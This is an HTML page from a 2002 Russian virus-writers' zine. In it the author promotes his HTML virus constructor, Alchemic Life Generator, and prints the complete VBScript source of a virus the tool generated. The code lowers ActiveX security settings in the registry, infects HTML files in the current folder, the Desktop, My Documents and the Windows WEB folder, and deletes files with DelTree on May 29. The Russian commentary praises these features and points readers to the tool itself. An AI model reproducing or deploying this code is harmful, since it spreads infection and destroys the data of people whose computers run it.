<HTML><HEAD>
<TITLE>HABITAT ZINE/ISSUE #3/JUNE 2002 [articles][ALG 1.65]</TITLE>

<STYLE type=text/css>
BODY {
	FONT-SIZE: 8pt; BACKGROUND: #2c468d; COLOR: #c0c0c0; FONT-FAMILY: "verdana"
}
A:link {
	COLOR: #c0c0c0; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:visited {
	COLOR: #c0c0c0; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:active {
	COLOR: #24bdff; TEXT-DECORATION: none;FONT-SIZE: 8pt;
}
A:hover {
	FONT-SIZE: 8pt; COLOR: #d2e9f9; TEXT-DECORATION: none; font-syle: "verdana"
}
P  {
        FONT-SIZE: 8pt; BACKGROUND: #2c468d; COLOR: #c0c0c0; FONT-FAMILY: "verdana"
   }
P.code{
        FONT-SIZE: 11pt; BACKGROUND: #2c468d; COLOR: #c0c0c0; FONT-FAMILY: "courier"
   }
H1 {
	FONT-SIZE: 22pt; COLOR: silver; FONT-FAMILY: "Times New Roman"; TEXT-ALIGN: center
}
H3 {
	FONT-SIZE: 14pt; COLOR: silver; FONT-FAMILY: courier; 
}
H4 {
	FONT-SIZE: 12pt; COLOR: silver; FONT-FAMILY: courier; 
}
I {
	COLOR: silver
}
B {
	FONT-WEIGHT: normal; COLOR: silver;FONT-SIZE: 8pt;
}
LI {
	FONT-WEIGHT: bold; MARGIN-LEFT: 3pt; COLOR: silver
}
CITE {
	FONT-WEIGHT: bold; FONT-SIZE: 16pt; COLOR: silver; FONT-FAMILY: "Times New Roman"
}
STRONG {
	FONT-WEIGHT: bold; COLOR: silver
}
</STYLE>

</HEAD>
<BODY topmargin=0 leftmargin=0>

<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0>
	<TR>
		<TD>
			<IMG SRC="images/habmenu_01.gif" WIDTH=110 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_02.gif" WIDTH=68 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_03.gif" WIDTH=71 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_04.gif" WIDTH=84 HEIGHT=79></TD>
		<TD>
			<IMG SRC="images/habmenu_05.gif" WIDTH=167 HEIGHT=79></TD>
	</TR>
	<TR>
		<TD><a href="hb_content.html"><IMG border=0 SRC="images/habmenu_06.gif" WIDTH=110 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#virus"><IMG border=0 SRC="images/habmenu_07.gif" WIDTH=68 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#article"><IMG border=0 SRC="images/habmenu_08.gif" WIDTH=71 HEIGHT=21></a></TD>
		<TD><a href="hb_content.html#rubric"><IMG border=0 SRC="images/habmenu_09.gif" WIDTH=84 HEIGHT=21></a></TD>
		<TD>
			<IMG SRC="images/habmenu_10.gif" WIDTH=167 HEIGHT=21></TD>
	</TR>
</TABLE>
<table width=500 cellspacing=0 cellpadding=10>
<tr><td align=left valign=top width=500>
<h3>Alchemic Life Generator 1.65</h3>
<p align=justify>
&nbsp; На идею написать свой собственный конструктор HTML вирусов меня натолкнуло то, что я
их не видел, я имею в виду хороших конструкторов. Вообще-то этот тоже не очень-то хороший,
в принципе было бы лучше если эти HTML ещё и по емэйлу размножались... ну может как-нибудь
в следующей версии, там посмотрим.
</p>
<p align=justify>
&nbsp; Ну, что ещё можно сказать, вполне нормальный генератор вирусов. Одно плохо, там всё
на английском, и даже юзер мануал, и тот на английском. Перевести всё это на русский как-то
руки не дошли, да и пустое это. Все наши вирмэйкеры английский знают, а вот для англоязычного
вирмера русский язык - это китайская грамота.
</p>
<p align=justify>
&nbsp; Далее привожу стандартный исходник сгенерированный ALG.
</p>
<img src="images\cuthere.gif">
<xmp>
<!--HTML.Noname00-->
<html><body>
<script Language="VBScript"><!--
on error resume next
REM HTML.Noname00 by Anonymous
if location.protocol="file:" then
msgbox "That's my message to the world!"
set a0h2c6=createobject("WScript.Shell")
set d1d4a4=createobject("Scripting.FileSystemObject")
a8a2i3=Replace(location.href,"/","\"):a8a2i3=Replace(a8a2i3,"file:\\\", ""):a8a2i3=d1d4a4.GetParentFolderName(a8a2i3)
set f3g8f3=document.body.createtextrange
a0h2c6.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
a0h2c6.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
if month(now)=5 and day(now)=29 then
a0h2c6.Run "DelTree /y *.* >null",vbHide
end if
f8g2a6(a8a2i3)
f8g2a6(d1d4a4.BuildPath(d1d4a4.GetSpecialFolder(0),"WEB"))
f8g2a6(a0h2c6.SpecialFolders("Desktop"))
f8g2a6(a0h2c6.SpecialFolders("MyDocuments"))
end if
sub f8g2a6(b3e2h2)
on error resume next
if d1d4a4.FolderExists(b3e2h2) then
Do
Set e1h2f9=d1d4a4.GetFolder(b3e2h2)
b3e2h2=d1d4a4.GetParentFolderName(b3e2h2)
Set e8h0b1=e1h2f9.Files
For each a7e8f5 in e8h0b1
f0f0f6=ucase(d1d4a4.GetExtensionName(a7e8f5.Name))
if f0f0f6="HTML" or f0f0f6="HTM" or f0f0f6="HTT" then
Set f7f2g5=d1d4a4.OpenTextFile(a7e8f5.path,1,False)
i6i2g2=f7f2g5.Readline
if i6i2g2="<!--HTML.Noname00-->" then
f7f2g5.close()
else
c8b2f9(a7e8f5.path)
end if
end if
next
Loop Until e1h2f9.IsRootFolder = True
end if
end sub
sub c8b2f9(i6d0f9)
On Error Resume Next
Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,1,False)
b1c1f4=f7f2g5.ReadAll()
f7f2g5.close()
Set f7f2g5=d1d4a4.OpenTextFile(i6d0f9,2,False)
f7f2g5.WriteLine("<!--HTML.Noname00-->")
f7f2g5.Write("<html><body>")
f7f2g5.WriteLine f3g8f3.htmlText
f7f2g5.WriteLine("</body></html>")
f7f2g5.Write(b1c1f4)
f7f2g5.Close
end sub
--></script>
</body></html>
</xmp>
<img src="images\cuthere.gif">
<p align=justify>
&nbsp; Некоторые особенности вируса:<br>
<strong>1.</strong> Вирус поражает "реальный" текущий каталог, а не каталогом выше, как
это делают многие вирусы подобного типа.<br>
<strong>2.</strong> При запуске вирус отключает повторную выдачу сообщений насчёт ActiveX, путём
записи в соответствующие разделы реестра нулей.<br>
<strong>3.</strong> Вирус заражает файлы в папке "мои документы" независимо от языка Windows,
будь то "My Documents" или "Мои Документы".
</p>
<p aling=justify>
&nbsp; Ну вот и всё. Сам конструктор ALG находится в архиве. Обо всех багах и 
недостатках конструктора сообщайте мне на мыло.
<br><br><br>
© Alchemist 2002.
</p>

</BODY>
</HTML>